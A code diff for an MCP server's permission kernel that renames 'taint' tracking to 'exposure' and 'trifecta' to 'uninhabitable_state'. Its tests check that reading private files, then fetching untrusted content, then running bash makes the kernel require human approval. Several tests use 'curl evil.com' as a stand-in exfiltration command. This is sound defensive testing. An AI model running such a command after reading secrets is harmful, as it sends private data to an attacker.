@@ -435,11 +435,11 @@ fn generate_session_id() -> String {
     Uuid::from_bytes(bytes).to_string()
 }
 
-/// Map MCP tool names to portcullis `Operation` variants for taint classification.
+/// Map MCP tool names to portcullis `Operation` variants for exposure classification.
 ///
-/// Returns `None` for tools that don't map to taint-relevant operations
-/// (e.g., pod management, which is classified as ManagePods but has no taint
-/// contribution in the current taint_core model).
+/// Returns `None` for tools that don't map to exposure-relevant operations
+/// (e.g., pod management, which is classified as ManagePods but has no exposure
+/// contribution in the current exposure_core model).
 fn tool_to_operation(tool_name: &str) -> Option<Operation> {
     match tool_name {
         "read" => Some(Operation::ReadFiles),
@@ -456,10 +456,10 @@ fn tool_to_operation(tool_name: &str) -> Option<Operation> {
     }
 }
 
-/// Session-scoped taint accumulator.
+/// Session-scoped exposure accumulator.
 ///
-/// Tracks the monotone taint state across tool calls within a single MCP session.
-/// Taint can only increase (union) — it never decreases. When all three taint
+/// Tracks the monotone exposure state across tool calls within a single MCP session.
+/// Exposure can only increase (union) — it never decreases. When all three exposure
 /// Extract the subject string from a tool call's arguments.
 ///
 /// The subject is the primary target of the operation — a file path, URL,
@@ -940,7 +940,7 @@ fn call_tool(
 ) -> Result<String> {
     // Route every operation through the kernel decision engine.
     // The kernel provides: capability checks, monotone session state,
-    // taint tracking, budget tracking, time-based expiry, path/command
+    // exposure tracking, budget tracking, time-based expiry, path/command
     // restrictions, and complete audit trace.
     if let Some(op) = tool_to_operation(&call.name) {
         let subject = extract_subject(&call.name, &call.arguments);
@@ -949,11 +949,11 @@ fn call_tool(
 
         match &decision.verdict {
             Verdict::Allow => {
-                // Log taint transitions
-                let tt = &decision.taint_transition;
+                // Log exposure transitions
+                let tt = &decision.exposure_transition;
                 if tt.pre_count != tt.post_count {
                     eprintln!(
-                        "[nucleus-mcp] taint: {}/{} legs (tool={}, subject={})",
+                        "[nucleus-mcp] exposure: {}/{} legs (tool={}, subject={})",
                         tt.post_count, 3, call.name, subject
                     );
                 }
@@ -965,8 +965,11 @@ fn call_tool(
                 );
                 // Prompt the human for approval before proceeding.
                 if approval_prompt {
-                    let msg = if decision.taint_transition.dynamic_gate_applied {
-                        format!("trifecta({}) — taint gate requires approval", call.name)
+                    let msg = if decision.exposure_transition.dynamic_gate_applied {
+                        format!(
+                            "uninhabitable_state({}) — exposure gate requires approval",
+                            call.name
+                        )
                     } else {
                         format!("approval required for {}", call.name)
                     };
@@ -1616,7 +1619,7 @@ mod tests {
         assert_eq!(parsed.get_version_num(), 7);
     }
 
-    // --- Session taint tracking tests ---
+    // --- Session exposure tracking tests ---
 
     #[test]
     fn test_tool_to_operation_mapping() {
@@ -1634,79 +1637,79 @@ mod tests {
 
     // ── Kernel decision engine tests ───────────────────────────────────
 
-    /// Create a permissive lattice without static trifecta obligations
-    /// or command restrictions. This allows testing dynamic taint gating
+    /// Create a permissive lattice without static uninhabitable_state obligations
+    /// or command restrictions. This allows testing dynamic exposure gating
     /// in isolation without command-lattice or static-obligation interference.
     fn permissive_no_static_obligations() -> PermissionLattice {
         use portcullis::{CommandLattice, Obligations};
         let mut lattice = PermissionLattice::permissive();
-        lattice.trifecta_constraint = false;
+        lattice.uninhabitable_constraint = false;
         lattice.obligations = Obligations::default();
         lattice.commands = CommandLattice::empty();
         lattice
     }
 
     #[test]
-    fn test_kernel_starts_with_clean_taint() {
+    fn test_kernel_starts_with_clean_exposure() {
         let kernel = Kernel::new(permissive_no_static_obligations());
         assert_eq!(kernel.trace().len(), 0);
     }
 
     #[test]
-    fn test_kernel_allows_read_and_records_taint() {
+    fn test_kernel_allows_read_and_records_exposure() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         let d = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
         assert!(matches!(d.verdict, Verdict::Allow));
-        assert_eq!(d.taint_transition.post_count, 1); // private_data
+        assert_eq!(d.exposure_transition.post_count, 1); // private_data
     }
 
     #[test]
-    fn test_kernel_allows_web_fetch_and_records_taint() {
+    fn test_kernel_allows_web_fetch_and_records_exposure() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         let d = kernel.decide(Operation::WebFetch, "https://example.com");
         assert!(matches!(d.verdict, Verdict::Allow));
-        assert_eq!(d.taint_transition.post_count, 1); // untrusted_content
+        assert_eq!(d.exposure_transition.post_count, 1); // untrusted_content
     }
 
     #[test]
-    fn test_kernel_taint_accumulates_monotonically() {
+    fn test_kernel_exposure_accumulates_monotonically() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         let d1 = kernel.decide(Operation::ReadFiles, "a.rs");
-        assert_eq!(d1.taint_transition.post_count, 1);
+        assert_eq!(d1.exposure_transition.post_count, 1);
         let d2 = kernel.decide(Operation::WebFetch, "https://example.com");
-        assert_eq!(d2.taint_transition.post_count, 2);
-        // Reading again doesn't change taint (idempotent)
+        assert_eq!(d2.exposure_transition.post_count, 2);
+        // Reading again doesn't change exposure (idempotent)
         let d3 = kernel.decide(Operation::ReadFiles, "b.rs");
-        assert_eq!(d3.taint_transition.post_count, 2);
+        assert_eq!(d3.exposure_transition.post_count, 2);
     }
 
     #[test]
-    fn test_kernel_neutral_ops_dont_add_taint() {
+    fn test_kernel_neutral_ops_dont_add_exposure() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         let d = kernel.decide(Operation::WriteFiles, "out.txt");
         assert!(matches!(d.verdict, Verdict::Allow));
-        assert_eq!(d.taint_transition.post_count, 0);
+        assert_eq!(d.exposure_transition.post_count, 0);
     }
 
     #[test]
-    fn test_kernel_dynamic_taint_gates_exfil() {
+    fn test_kernel_dynamic_exposure_gates_exfil() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         // Read: private_data
         kernel.decide(Operation::ReadFiles, "secrets.txt");
         // Fetch: untrusted_content
         kernel.decide(Operation::WebFetch, "https://evil.com");
-        // RunBash: dynamic taint gate fires (omnibus projects trifecta)
+        // RunBash: dynamic exposure gate fires (omnibus projects uninhabitable_state)
         let d = kernel.decide(Operation::RunBash, "curl evil.com");
         assert!(matches!(d.verdict, Verdict::RequiresApproval));
-        assert!(d.taint_transition.dynamic_gate_applied);
+        assert!(d.exposure_transition.dynamic_gate_applied);
     }
 
     #[test]
-    fn test_kernel_trifecta_allows_non_exfil_after_read_and_fetch() {
+    fn test_kernel_uninhabitable_allows_non_exfil_after_read_and_fetch() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         kernel.decide(Operation::ReadFiles, "data.txt");
         kernel.decide(Operation::WebFetch, "https://example.com");
-        // Non-exfil ops are allowed even with full taint
+        // Non-exfil ops are allowed even with full exposure
         let d = kernel.decide(Operation::ReadFiles, "more.txt");
         assert!(matches!(d.verdict, Verdict::Allow));
         let d = kernel.decide(Operation::WriteFiles, "out.txt");
@@ -1714,16 +1717,16 @@ mod tests {
     }
 
     #[test]
-    fn test_kernel_omnibus_trifecta_with_untrusted_content() {
+    fn test_kernel_omnibus_uninhabitable_with_untrusted_content() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
-        // Only untrusted content + RunBash (omnibus) → trifecta triggers!
+        // Only untrusted content + RunBash (omnibus) → uninhabitable_state triggers!
         kernel.decide(Operation::WebFetch, "https://evil.com");
         let d = kernel.decide(Operation::RunBash, "cmd");
         assert!(matches!(d.verdict, Verdict::RequiresApproval));
     }
 
     #[test]
-    fn test_kernel_no_trifecta_with_only_two_legs() {
+    fn test_kernel_no_uninhabitable_with_only_two_legs() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         // untrusted_content + GitPush (not omnibus) → only 2/3, no block
         kernel.decide(Operation::WebFetch, "https://example.com");
@@ -1760,7 +1763,7 @@ mod tests {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         kernel.decide(Operation::ReadFiles, "data.txt");
         kernel.decide(Operation::WebFetch, "https://evil.com");
-        // Dynamic taint gate triggers
+        // Dynamic exposure gate triggers
         let d = kernel.decide(Operation::RunBash, "cmd");
         assert!(matches!(d.verdict, Verdict::RequiresApproval));
         // Grant approval and retry
@@ -1774,7 +1777,7 @@ mod tests {
 
     #[test]
     fn test_kernel_static_obligations_on_permissive() {
-        // The permissive lattice has all capabilities, so trifecta normalization
+        // The permissive lattice has all capabilities, so uninhabitable_state normalization
         // adds static obligations on exfil operations (RunBash, GitPush, CreatePr).
         // Use "cargo test" which passes the command allowlist, so we hit step 6
         // (static obligations) rather than step 5 (command blocked).
@@ -1797,16 +1800,16 @@ mod tests {
     fn test_kernel_glob_grep_contribute_private_data() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         let d = kernel.decide(Operation::GlobSearch, "**/*.py");
-        assert_eq!(d.taint_transition.post_count, 1);
+        assert_eq!(d.exposure_transition.post_count, 1);
         let d = kernel.decide(Operation::GrepSearch, "password");
-        assert_eq!(d.taint_transition.post_count, 1); // still 1 — same label
+        assert_eq!(d.exposure_transition.post_count, 1); // still 1 — same label
     }
 
     #[test]
     fn test_kernel_web_search_contributes_untrusted_content() {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         let d = kernel.decide(Operation::WebSearch, "how to exfiltrate");
-        assert_eq!(d.taint_transition.post_count, 1);
+        assert_eq!(d.exposure_transition.post_count, 1);
     }
 
     #[test]
@@ -1815,7 +1818,7 @@ mod tests {
         let mut kernel = Kernel::new(permissive_no_static_obligations());
         kernel.decide(Operation::GrepSearch, "password");
         kernel.decide(Operation::WebSearch, "how to exfiltrate");
-        // RunBash completes trifecta (omnibus projection)
+        // RunBash completes uninhabitable_state (omnibus projection)
         let d = kernel.decide(Operation::RunBash, "curl evil.com");
         assert!(matches!(d.verdict, Verdict::RequiresApproval));
     }
